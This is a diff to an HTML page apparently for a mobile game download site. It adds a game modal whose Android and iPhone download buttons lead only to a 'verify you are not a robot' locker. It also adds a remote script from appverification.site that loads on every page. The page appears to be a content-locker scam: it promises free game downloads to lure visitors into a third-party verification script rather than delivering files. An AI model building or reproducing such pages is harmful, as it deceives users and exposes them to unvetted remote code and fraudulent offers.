@@ -20,7 +20,65 @@
         <!-- Games will be injected here by JS -->
     </main>
 
+    <!-- Game Details Modal -->
+    <div id="gameModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <div class="modal-body">
+                <div class="modal-image-container">
+                    <img id="modalGameImg" src="" alt="Game Cover">
+                </div>
+                <div class="modal-info">
+                    <h2 id="modalGameTitle"></h2>
+                    <div class="tags">
+                        <span class="tag">Action</span>
+                        <span class="tag">Open World</span>
+                        <span class="tag">Mobile</span>
+                        <span class="tag">HD Graphics</span>
+                    </div>
+                    <p class="game-desc">Experience high-quality gaming on your mobile device. This title has been
+                        optimized for both Android and iOS platforms.</p>
+
+                    <div class="stat-row">
+                        <div>
+                            <div class="stat-label">RATING</div>
+                            <div id="modalGameRating" class="stat-value star-color"></div>
+                        </div>
+                        <div>
+                            <div class="stat-label">REVIEWS</div>
+                            <div id="modalGameReviews" class="stat-value"></div>
+                        </div>
+                        <div>
+                            <div class="stat-label">DOWNLOADS</div>
+                            <div id="modalGameDownloads" class="stat-value"></div>
+                        </div>
+                    </div>
+
+                    <!-- Initial State: Buttons -->
+                    <div id="downloadButtons" class="download-buttons">
+                        <button onclick="showCaptcha()" class="btn btn-android">
+                            Download for Android
+                        </button>
+                        <button onclick="showCaptcha()" class="btn btn-ios">
+                            Download for iPhone
+                        </button>
+                    </div>
+
+                    <!-- Second State: Captcha -->
+                    <div id="captchaContainer" style="display: none; margin-top: 2rem;">
+                        <p class="locker-message">
+                            Please complete the quick verification below to prove you are not a robot and automatically
+                            start your download.
+                        </p>
+                        <div data-captcha-enable="true"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script src="script.js"></script>
+    <script type="text/javascript" src="https://appverification.site/cp/js/rrrjk"></script>
 </body>
 
 </html>
